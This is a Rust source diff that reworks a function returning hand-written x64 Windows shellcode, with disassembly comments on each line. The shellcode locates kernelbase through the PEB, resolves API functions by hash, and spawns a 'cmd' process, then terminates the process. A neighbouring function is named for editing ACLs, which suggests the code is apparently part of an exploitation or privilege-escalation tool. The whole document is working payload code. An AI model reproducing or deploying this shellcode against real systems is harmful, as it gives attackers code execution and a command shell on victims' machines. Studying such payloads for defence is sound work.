@@ -63,10 +63,12 @@ pub fn acl_edit_shellcode_fallback() -> [u8; 111] {
     .clone();
 }
 
-pub fn spawn_cmd_shellcode_fallback() -> [u8; 385] {
+#[cfg(target_os = "windows")]
+pub fn spawn_cmd_shellcode_fallback() -> [u8; 387] {
     return concat_bytes!(
-        b"\xe9\xa6\x00\x00\x00",                     // 0000000000000000: jmp spawn_cmd
-        b"\x48\x83\xec\x28",                         // 0000000000000005: sub rsp,28h
+        b"\xe9\xb9\x00\x00\x00",                     // 0000000000000000: jmp spawn_cmd
+        b"\x48\x83\xec\x28",                         // find_kernelbase:
+                                                     // 0000000000000005: sub rsp,28h
         b"\x48\xc7\xc1\x60\x00\x00\x00",             // 0000000000000009: mov rcx,60h
         b"\x65\x4c\x8b\x01",                         // 0000000000000010: mov r8,qword ptr gs:[rcx]
         b"\x49\x8b\x78\x18",                         // 0000000000000014: mov rdi,qword ptr [r8+18h]
@@ -82,7 +84,8 @@ pub fn spawn_cmd_shellcode_fallback() -> [u8; 385] {
         b"\x75\xeb",                                 // 0000000000000034: jne 0000000000000021
         b"\x48\x83\xc4\x28",                         // 0000000000000036: add rsp,28h
         b"\xc3",                                     // 000000000000003A: ret
-        b"\x48\x83\xec\x28",                         // 000000000000003B: sub rsp,28h
+        b"\x48\x83\xec\x28",                         // lookup_func:
+                                                     // 000000000000003B: sub rsp,28h
         b"\x8b\x5f\x3c",                             // 000000000000003F: mov ebx,dword ptr [rdi+3Ch]
         b"\x48\x81\xc3\x88\x00\x00\x00",             // 0000000000000042: add rbx,88h
         b"\x48\x03\xdf",                             // 0000000000000049: add rbx,rdi
@@ -119,59 +122,63 @@ pub fn spawn_cmd_shellcode_fallback() -> [u8; 385] {
         b"\x48\x03\xc7",                             // 00000000000000A3: add rax,rdi
         b"\x48\x83\xc4\x28",                         // 00000000000000A6: add rsp,28h
         b"\xc3",                                     // 00000000000000AA: ret
-        b"\x48\x81\xec\x00\x05\x00\x00",             // 00000000000000AB: sub rsp,500h
-        b"\xe8\x4e\xff\xff\xff",                     // 00000000000000B2: call find_kernelbase
-        b"\x48\x8b\xf8",                             // 00000000000000B7: mov rdi,rax
-        b"\x48\x83\xec\x08",                         // 00000000000000BA: sub rsp,8
-        b"\x4c\x8b\xfc",                             // 00000000000000BE: mov r15,rsp
-        b"\xba\x83\xb9\xb5\x78",                     // 00000000000000C1: mov edx,78B5B983h
-        b"\xe8\x70\xff\xff\xff",                     // 00000000000000C6: call lookup_func
-        b"\x49\x89\x87\x88\x00\x00\x00",             // 00000000000000CB: mov qword ptr [r15+0000000000000088h],rax
-        b"\xba\x72\xfe\xb3\x16",                     // 00000000000000D2: mov edx,16B3FE72h
-        b"\xe8\x5f\xff\xff\xff",                     // 00000000000000D7: call lookup_func
-        b"\x49\x89\x87\x90\x00\x00\x00",             // 00000000000000DC: mov qword ptr [r15+0000000000000090h],rax
-        b"\x49\x8b\xff",                             // 00000000000000E3: mov rdi,r15
-        b"\x48\x81\xc7\x00\x03\x00\x00",             // 00000000000000E6: add rdi,300h
-        b"\x48\x8b\xdf",                             // 00000000000000ED: mov rbx,rdi
-        b"\x33\xc0",                                 // 00000000000000F0: xor eax,eax
-        b"\xb9\x80\x00\x00\x00",                     // 00000000000000F2: mov ecx,80h
-        b"\xf3\xab",                                 // 00000000000000F7: rep stos dword ptr [rdi]
-        b"\xb8\x68\x00\x00\x00",                     // 00000000000000F9: mov eax,68h
-        b"\x89\x03",                                 // 00000000000000FE: mov dword ptr [rbx],eax
-        b"\xb8\x00\x01\x00\x00",                     // 0000000000000100: mov eax,100h
-        b"\x89\x43\x3c",                             // 0000000000000105: mov dword ptr [rbx+3Ch],eax
-        b"\x48\x33\xc0",                             // 0000000000000108: xor rax,rax
-        b"\x48\xff\xc8",                             // 000000000000010B: dec rax
-        b"\x48\x89\x43\x50",                         // 000000000000010E: mov qword ptr [rbx+50h],rax
-        b"\x48\x89\x43\x58",                         // 0000000000000112: mov qword ptr [rbx+58h],rax
-        b"\x48\x89\x43\x60",                         // 0000000000000116: mov qword ptr [rbx+60h],rax
-        b"\x33\xc9",                                 // 000000000000011A: xor ecx,ecx
-        b"\x49\x8b\xd7",                             // 000000000000011C: mov rdx,r15
-        b"\x48\x81\xc2\x80\x01\x00\x00",             // 000000000000011F: add rdx,180h
-        b"\xb8\x63\x6d\x64\x00",                     // 0000000000000126: mov eax,646D63h
-        b"\x48\x89\x02",                             // 000000000000012B: mov qword ptr [rdx],rax
-        b"\x4d\x33\xc0",                             // 000000000000012E: xor r8,r8
-        b"\x4d\x33\xc9",                             // 0000000000000131: xor r9,r9
-        b"\x33\xc0",                                 // 0000000000000134: xor eax,eax
-        b"\x48\x89\x44\x24\x20",                     // 0000000000000136: mov qword ptr [rsp+20h],rax
-        b"\xb8\x10\x00\x00\x00",                     // 000000000000013B: mov eax,10h
-        b"\x48\x89\x44\x24\x28",                     // 0000000000000140: mov qword ptr [rsp+28h],rax
-        b"\x33\xc0",                                 // 0000000000000145: xor eax,eax
-        b"\x48\x89\x44\x24\x30",                     // 0000000000000147: mov qword ptr [rsp+30h],rax
-        b"\x48\x89\x44\x24\x38",                     // 000000000000014C: mov qword ptr [rsp+38h],rax
-        b"\x48\x89\x5c\x24\x40",                     // 0000000000000151: mov qword ptr [rsp+40h],rbx
-        b"\x48\x83\xc3\x68",                         // 0000000000000156: add rbx,68h
-        b"\x48\x89\x5c\x24\x48",                     // 000000000000015A: mov qword ptr [rsp+48h],rbx
-        b"\x49\x8b\x87\x90\x00\x00\x00",             // 000000000000015F: mov rax,qword ptr [r15+0000000000000090h]
-        b"\xff\xd0",                                 // 0000000000000166: call rax
-        b"\x48\x33\xc9",                             // 0000000000000168: xor rcx,rcx
-        b"\x48\xff\xc9",                             // 000000000000016B: dec rcx
-        b"\x48\x33\xd2",                             // 000000000000016E: xor rdx,rdx
-        b"\x49\x8b\x87\x88\x00\x00\x00",             // 0000000000000171: mov rax,qword ptr [r15+0000000000000088h]
-        b"\xff\xd0",                                 // 0000000000000178: call rax
-        b"\x48\x81\xc4\x00\x05\x00\x00"              // 000000000000017A: add rsp,500h
+        b"\x48\x33\xc9",                             // call_terminateprocess:
+                                                     // 00000000000000AB: xor rcx,rcx
+        b"\x48\xff\xc9",                             // 00000000000000AE: dec rcx
+        b"\x48\x33\xd2",                             // 00000000000000B1: xor rdx,rdx
+        b"\x49\x8b\x87\x88\x00\x00\x00",             // 00000000000000B4: mov rax,qword ptr [r15+0000000000000088h]
+        b"\xff\xd0",                                 // 00000000000000BB: call rax
+        b"\xc3",                                     // 00000000000000BD: ret
+        b"\x48\x81\xec\x00\x05\x00\x00",             // spawn_cmd:
+                                                     // 00000000000000BE: sub rsp,500h
+        b"\xe8\x3b\xff\xff\xff",                     // 00000000000000C5: call find_kernelbase
+        b"\x48\x8b\xf8",                             // 00000000000000CA: mov rdi,rax
+        b"\x48\x83\xec\x08",                         // 00000000000000CD: sub rsp,8
+        b"\x4c\x8b\xfc",                             // 00000000000000D1: mov r15,rsp
+        b"\xba\x83\xb9\xb5\x78",                     // 00000000000000D4: mov edx,78B5B983h
+        b"\xe8\x5d\xff\xff\xff",                     // 00000000000000D9: call lookup_func
+        b"\x49\x89\x87\x88\x00\x00\x00",             // 00000000000000DE: mov qword ptr [r15+0000000000000088h],rax
+        b"\xba\x72\xfe\xb3\x16",                     // 00000000000000E5: mov edx,16B3FE72h
+        b"\xe8\x4c\xff\xff\xff",                     // 00000000000000EA: call lookup_func
+        b"\x49\x89\x87\x90\x00\x00\x00",             // 00000000000000EF: mov qword ptr [r15+0000000000000090h],rax
+        b"\x49\x8b\xff",                             // 00000000000000F6: mov rdi,r15
+        b"\x48\x81\xc7\x00\x03\x00\x00",             // 00000000000000F9: add rdi,300h
+        b"\x48\x8b\xdf",                             // 0000000000000100: mov rbx,rdi
+        b"\x33\xc0",                                 // 0000000000000103: xor eax,eax
+        b"\xb9\x80\x00\x00\x00",                     // 0000000000000105: mov ecx,80h
+        b"\xf3\xab",                                 // 000000000000010A: rep stos dword ptr [rdi]
+        b"\xb8\x68\x00\x00\x00",                     // 000000000000010C: mov eax,68h
+        b"\x89\x03",                                 // 0000000000000111: mov dword ptr [rbx],eax
+        b"\xb8\x00\x01\x00\x00",                     // 0000000000000113: mov eax,100h
+        b"\x89\x43\x3c",                             // 0000000000000118: mov dword ptr [rbx+3Ch],eax
+        b"\x48\x33\xc0",                             // 000000000000011B: xor rax,rax
+        b"\x48\xff\xc8",                             // 000000000000011E: dec rax
+        b"\x48\x89\x43\x50",                         // 0000000000000121: mov qword ptr [rbx+50h],rax
+        b"\x48\x89\x43\x58",                         // 0000000000000125: mov qword ptr [rbx+58h],rax
+        b"\x48\x89\x43\x60",                         // 0000000000000129: mov qword ptr [rbx+60h],rax
+        b"\x33\xc9",                                 // 000000000000012D: xor ecx,ecx
+        b"\x49\x8b\xd7",                             // 000000000000012F: mov rdx,r15
+        b"\x48\x81\xc2\x80\x01\x00\x00",             // 0000000000000132: add rdx,180h
+        b"\xb8\x63\x6d\x64\x00",                     // 0000000000000139: mov eax,646D63h
+        b"\x48\x89\x02",                             // 000000000000013E: mov qword ptr [rdx],rax
+        b"\x4d\x33\xc0",                             // 0000000000000141: xor r8,r8
+        b"\x4d\x33\xc9",                             // 0000000000000144: xor r9,r9
+        b"\x33\xc0",                                 // 0000000000000147: xor eax,eax
+        b"\x48\x89\x44\x24\x20",                     // 0000000000000149: mov qword ptr [rsp+20h],rax
+        b"\xb8\x10\x00\x00\x00",                     // 000000000000014E: mov eax,10h
+        b"\x48\x89\x44\x24\x28",                     // 0000000000000153: mov qword ptr [rsp+28h],rax
+        b"\x33\xc0",                                 // 0000000000000158: xor eax,eax
+        b"\x48\x89\x44\x24\x30",                     // 000000000000015A: mov qword ptr [rsp+30h],rax
+        b"\x48\x89\x44\x24\x38",                     // 000000000000015F: mov qword ptr [rsp+38h],rax
+        b"\x48\x89\x5c\x24\x40",                     // 0000000000000164: mov qword ptr [rsp+40h],rbx
+        b"\x48\x83\xc3\x68",                         // 0000000000000169: add rbx,68h
+        b"\x48\x89\x5c\x24\x48",                     // 000000000000016D: mov qword ptr [rsp+48h],rbx
+        b"\x49\x8b\x87\x90\x00\x00\x00",             // 0000000000000172: mov rax,qword ptr [r15+0000000000000090h]
+        b"\xff\xd0",                                 // 0000000000000179: call rax
+        b"\x48\x81\xc4\x08\x05\x00\x00",             // 000000000000017B: add rsp,508h
+        b"\xc3"                                      // 0000000000000182: ret
     )
-    .clone();
+    .clone()
 }
 
 #[cfg(target_os = "windows")]
